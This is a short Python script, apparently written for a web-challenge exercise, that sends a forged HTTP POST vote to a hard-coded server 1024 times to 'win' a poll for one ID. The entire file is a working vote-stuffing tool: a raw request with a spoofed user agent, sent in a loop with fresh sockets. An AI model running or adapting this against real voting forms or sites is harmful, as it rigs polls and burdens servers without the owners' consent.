#!/usr/bin/python3
"""Make a simple HTTP request 1024 times"""


import socket
import time


request = b'''POST /level0.php HTTP/1.1\r
Connection: close\r
Content-Length: 25\r
Content-Type: application/x-www-form-urlencoded\r
Host: 158.69.76.135\r
Origin: http://158.69.76.135\r
Referer: http://158.69.76.135/level0.php\r
User-Agent: U.S. Department of Agriculture Doomsday Satellite\r
\r
id=701&holdthedoor=Submit'''
"""The entire request needed to forge the vote"""


def makeRequestOnSocket(sock: socket.socket):
    """Make the vote request on a connected socket

    Args:
        sock: socket to send request on

    """

    sock.sendall(request)


def openSocket() -> socket.socket:
    """Make a new socket connected to the target server"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('158.69.76.135', 80))
    return sock


def winElection():
    """Vote for myself 1024 times"""

    for i in range(1024):
        sock = openSocket()
        makeRequestOnSocket(sock)
        sock.close()
        time.sleep(0.1)
        print(i)


if __name__ == '__main__':
    winElection()
